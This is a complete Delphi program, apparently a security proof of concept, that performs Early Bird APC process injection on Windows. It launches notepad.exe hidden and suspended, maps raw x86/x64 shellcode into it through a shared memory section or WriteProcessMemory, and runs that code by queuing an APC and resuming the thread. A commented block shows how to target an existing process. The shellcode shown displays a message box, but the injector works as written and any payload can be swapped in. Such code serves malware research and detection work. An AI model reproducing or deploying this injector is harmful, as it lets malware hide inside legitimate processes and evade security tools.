// Support both x86-32 and x86-64

program APCInjector;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils,
  WinAPI.Messages,
  WinAPI.Windows;

type
  EWindowsException = class(Exception)
  private
    FLastError : Integer;
  public
    {@C}
    constructor Create(const WinAPI : String); overload;

    {@G}
    property LastError : Integer read FLastError;
  end;


const STATUS_SUCCESS         = NTSTATUS($0);
      THREAD_SET_CONTEXT     = $10;
      THREAD_SUSPEND_RESUME  = $2;
      ViewShare              = 1;
      ViewUnmap              = 2;

type
  SECTION_INHERIT = ViewShare..ViewUnmap;

  ARCH_ULONG  = {$IFDEF WIN64} ULONG64  {$ELSE} ULONG  {$ENDIF};
  ARCH_PULONG = {$IFDEF WIN64} PULONG64 {$ELSE} PULONG {$ENDIF};

  function NtCreateSection(
    SectionHandle    : PHandle;
    DesiredAccess    : ACCESS_MASK;
    ObjectAttributes : Pointer;
    SectionSize      : PLargeInteger;
    Protect          : ULONG;
    Attributes       : ULONG;
    FileHandle       : THandle
  ): NTSTATUS; stdcall; external 'ntdll.dll';

  function NtMapViewOfSection(
      SectionHandle      : THandle;
      ProcessHandle      : THandle;
      BaseAddress        : PPVOID;
      ZeroBits           : ARCH_ULONG;
      CommitSize         : ARCH_ULONG;
      SectionOffset      : PLargeInteger;
      ViewSize           : ARCH_PULONG;
      InheritDisposition : SECTION_INHERIT;
      AllocationType     : ARCH_ULONG;
      Protect            : ARCH_ULONG
  ): NTSTATUS; stdcall; external 'ntdll.dll';

  function NtUnmapViewOfSection(
    ProcessHandle : THandle;
    BaseAddress   : PVOID
  ): NTSTATUS; stdcall; external 'ntdll.dll';

  function NtClose(
    Handle : THandle
  ): NTSTATUS; stdcall; external 'ntdll.dll';

  function NtTestAlert(): DWORD; stdcall; external 'ntdll.dll';

  function OpenThread(
    dwDesiredAccess : DWORD;
    bInheritHandle  : BOOL;
    dwThreadId      : DWORD
  ): DWORD; stdcall; external 'kernel32.dll';


constructor EWindowsException.Create(const WinAPI : String);
var AFormatedMessage : String;
begin
  FLastError := GetLastError();

  AFormatedMessage := Format('___%s: last_err=%d, last_err_msg="%s".', [
      WinAPI,
      FLastError,
      SysErrorMessage(FLastError)
  ]);

  ///
  inherited Create(AFormatedMessage);
end;

var // hWindow               : THandle;
    // AProcessId            : Cardinal;
    // AThreadId             : Integer;
    hThread               : THandle;
    // hRemoteProcess        : THandle;
    pRemotePayloadAddress : Pointer;
    hProcess              : THandle;
    AStartupInfo          : TStartupInfo;
    AProcessInfo          : TProcessInformation;

    {$IFDEF WIN64}
      // Execute a messagebox in target process (x86-64)
      const PAYLOAD : array[0..284-1] of byte = (
          $fc, $48, $81, $e4, $f0, $ff, $ff, $ff, $e8, $d0, $00, $00, $00, $41, $51,
          $41, $50, $52, $51, $56, $48, $31, $d2, $65, $48, $8b, $52, $60, $3e, $48,
          $8b, $52, $18, $3e, $48, $8b, $52, $20, $3e, $48, $8b, $72, $50, $3e, $48,
          $0f, $b7, $4a, $4a, $4d, $31, $c9, $48, $31, $c0, $ac, $3c, $61, $7c, $02,
          $2c, $20, $41, $c1, $c9, $0d, $41, $01, $c1, $e2, $ed, $52, $41, $51, $3e,
          $48, $8b, $52, $20, $3e, $8b, $42, $3c, $48, $01, $d0, $3e, $8b, $80, $88,
          $00, $00, $00, $48, $85, $c0, $74, $6f, $48, $01, $d0, $50, $3e, $8b, $48,
          $18, $3e, $44, $8b, $40, $20, $49, $01, $d0, $e3, $5c, $48, $ff, $c9, $3e,
          $41, $8b, $34, $88, $48, $01, $d6, $4d, $31, $c9, $48, $31, $c0, $ac, $41,
          $c1, $c9, $0d, $41, $01, $c1, $38, $e0, $75, $f1, $3e, $4c, $03, $4c, $24,
          $08, $45, $39, $d1, $75, $d6, $58, $3e, $44, $8b, $40, $24, $49, $01, $d0,
          $66, $3e, $41, $8b, $0c, $48, $3e, $44, $8b, $40, $1c, $49, $01, $d0, $3e,
          $41, $8b, $04, $88, $48, $01, $d0, $41, $58, $41, $58, $5e, $59, $5a, $41,
          $58, $41, $59, $41, $5a, $48, $83, $ec, $20, $41, $52, $ff, $e0, $58, $41,
          $59, $5a, $3e, $48, $8b, $12, $e9, $49, $ff, $ff, $ff, $5d, $49, $c7, $c1,
          $30, $00, $00, $00, $3e, $48, $8d, $95, $fe, $00, $00, $00, $3e, $4c, $8d,
          $85, $0b, $01, $00, $00, $48, $31, $c9, $41, $ba, $45, $83, $56, $07, $ff,
          $d5, $48, $31, $c9, $41, $ba, $f0, $b5, $a2, $56, $ff, $d5, $48, $65, $6c,
          $6c, $6f, $2c, $20, $57, $6f, $72, $6c, $64, $00, $42, $6f, $6f, $00
      );

    {$ELSE}
      // Execute a messagebox in target process (x86-32)
      const PAYLOAD : array[0..236-1] of byte = (
          $d9, $eb, $9b, $d9, $74, $24, $f4, $31, $d2, $b2, $77, $31, $c9, $64, $8b,
          $71, $30, $8b, $76, $0c, $8b, $76, $1c, $8b, $46, $08, $8b, $7e, $20, $8b,
          $36, $38, $4f, $18, $75, $f3, $59, $01, $d1, $ff, $e1, $60, $8b, $6c, $24,
          $24, $8b, $45, $3c, $8b, $54, $28, $78, $01, $ea, $8b, $4a, $18, $8b, $5a,
          $20, $01, $eb, $e3, $34, $49, $8b, $34, $8b, $01, $ee, $31, $ff, $31, $c0,
          $fc, $ac, $84, $c0, $74, $07, $c1, $cf, $0d, $01, $c7, $eb, $f4, $3b, $7c,
          $24, $28, $75, $e1, $8b, $5a, $24, $01, $eb, $66, $8b, $0c, $4b, $8b, $5a,
          $1c, $01, $eb, $8b, $04, $8b, $01, $e8, $89, $44, $24, $1c, $61, $c3, $b2,
          $04, $29, $d4, $89, $e5, $89, $c2, $68, $8e, $4e, $0e, $ec, $52, $e8, $9f,
          $ff, $ff, $ff, $89, $45, $04, $68, $6c, $6c, $20, $41, $68, $33, $32, $2e,
          $64, $68, $75, $73, $65, $72, $30, $db, $88, $5c, $24, $0a, $89, $e6, $56,
          $ff, $55, $04, $89, $c2, $50, $bb, $a8, $a2, $4d, $bc, $87, $1c, $24, $52,
          $e8, $70, $ff, $ff, $ff, $68, $42, $6f, $6f, $58, $31, $db, $88, $5c, $24,
          $03, $89, $e3, $68, $58, $20, $20, $20, $68, $6f, $72, $6c, $64, $68, $6f,
          $2c, $20, $57, $68, $48, $65, $6c, $6c, $31, $c9, $88, $4c, $24, $0c, $89,
          $e1, $31, $d2, $6a, $30, $53, $51, $52, $ff, $d0, $90
      );
    {$ENDIF}


{ Inject_WriteProcessMemory
  This method use the classic WriteProcessMemory method to inject our payload to remote process }
function Inject_WriteProcessMemory(const hProcess : THandle; const pBuffer : PVOID; const ABufferSize : Cardinal) : Pointer;
var ABytesWritten : SIZE_T;
    pAddress      : Pointer;
begin
  result := nil;
  ///

  if not Assigned(pBuffer) or (AbufferSize = 0) then
    exit();

  pAddress := VirtualAllocEx(hProcess, nil, ABufferSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if not Assigned(pAddress) then
    raise EWindowsException.Create('VirtualAllocEx');
  ///

  if not WriteProcessMemory(hProcess, pAddress, pBuffer, ABufferSize, ABytesWritten) then
    raise EWindowsException.Create('WriteProcessMemory');
  ///

  result := pAddress;
end;

function MapViewOfSection(const ASectionHandle, hProcess : THandle; const ASectionSize : ULONG; const AInherit : SECTION_INHERIT) : Pointer;
var ANTStatus       : NTSTATUS;
    pSectionAddress : Pointer;
begin
  pSectionAddress := nil;

  ANTStatus := NtMapViewOfSection(
      ASectionHandle,
      hProcess,
      @pSectionAddress,
      0,
      0,
      nil,
      @ASectionSize,
      AInherit,
      0,
      PAGE_EXECUTE_READWRITE
  );

  if ANTStatus <> STATUS_SUCCESS then
    raise Exception.Create(Format('NtMapViewOfSection failed, NTStatus=[%d]', [ANTStatus]));

  ///
  result := pSectionAddress;
end;

{ Inject_SharedSection
  This method used a shared section to inject our payload to a remote process }
function Inject_SharedSection(const hProcess : THandle; const pBuffer : PVOID; const ABufferSize : Cardinal) : Pointer;
var ANTStatus             : NTSTATUS;
    ASectionHandle        : THandle;
    pLocalSectionAddress  : Pointer;
    pRemoteSectionAddress : Pointer;
    ASectionSize          : TLargeInteger;
begin
  result := nil;
  ///

  ASectionSize := ABufferSize;

  ASectionHandle := 0;
  pLocalSectionAddress := nil;
  try
    // Create a new memory section
    ANTStatus := NtCreateSection(
      @ASectionHandle,
        SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,
        nil,
        @ASectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        0
    );

    if ANTStatus <> STATUS_SUCCESS then
      raise Exception.Create(Format('NtCreateSection failed, NTStatus=[%d]', [ANTStatus]));
    ///

    // Map new section and share it with target process
    pLocalSectionAddress  := MapViewOfSection(ASectionHandle, GetCurrentProcess(), ABufferSize, ViewUnmap);
    pRemoteSectionAddress := MapViewOfSection(ASectionHandle, hProcess, ABufferSize, ViewShare);

    // Copy our payload to our new section
    CopyMemory(pLocalSectionAddress, pBuffer, ABufferSize);
  finally
    // Unmap section for current process
    if Assigned(pLocalSectionAddress) then
      NtUnmapViewOfSection(GetCurrentProcess(), pLocalSectionAddress);

    // Close section for our current process
    if ASectionHandle <> 0 then
      NtClose(ASectionHandle);
  end;

  ///
  result := pRemoteSectionAddress; // Return payload location in remote process
end;

begin
  try
    (*
      // Bellow code demonstrate how to use FindWindow + GetWindowThreadProcessId and
      // OpenProcess to achieve the same result in an existing process.
      // Bellow method when possible is interesting to avoid iterating on threads.

      // Get target process handle from its window handle
      hWindow := FindWindowW(nil, 'PEView - Untitled');
      if hWindow = 0 then
        raise Exception.Create('Could not find window handle.');
      ///

      // Get target process identifier from its window handle
      AThreadId := GetWindowThreadProcessId(hWindow, AProcessId);
      if AProcessId = 0 then
        raise EWindowsException.Create('GetWindowThreadProcessId');
      ///

      // Open target process
      hRemoteProcess := OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, AProcessId);
      if hRemoteProcess = 0 then
        raise EWindowsException.Create('OpenProcess');

      // hThread := OpenThread(THREAD_SET_CONTEXT or THREAD_SUSPEND_RESUME, False, AProcessInfo.hThread);
      // if hThread = 0 then
      //    raise EWindowsException.Create('OpenThread');
    *)

    ZeroMemory(@AProcessInfo, SizeOf(TProcessInformation));
    ZeroMemory(@AStartupInfo, Sizeof(TStartupInfo));

    AStartupInfo.cb          := SizeOf(TStartupInfo);
    AStartupInfo.wShowWindow := SW_HIDE;
    AStartupInfo.dwFlags     := (STARTF_USESHOWWINDOW);

    if not CreateProcessW(
        'c:\Windows\notepad.exe', // Edit here accordingly
        nil,                      // Edit here accordingly
        nil,
        nil,
        False,
        CREATE_SUSPENDED,
        nil,
        nil,
        AStartupInfo,
        AProcessInfo
    ) then
      raise EWindowsException.Create('CreateProcessW');
    try

      try
        // Alternatively you can comment "Inject_SharedSection" and use "Inject_WriteProcessMemory" instead.
        pRemotePayloadAddress := Inject_SharedSection(AProcessInfo.hProcess, @PAYLOAD, Length(PAYLOAD));
        // pRemotePayloadAddress := Inject_WriteProcessMemory(AProcessInfo.hProcess, @PAYLOAD, Length(PAYLOAD));

        if not Assigned(pRemotePayloadAddress) then
          raise Exception.Create('Could not inject buffer to remote process.');

        if not QueueUserAPC(pRemotePayloadAddress, AProcessInfo.hThread, 0) then
          raise EWindowsException.Create('QueueUserAPC');

        ResumeThread(AProcessInfo.hThread);
      finally
        CloseHandle(hThread);
      end;
    finally
      CloseHandle(AProcessInfo.hThread);
    end;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.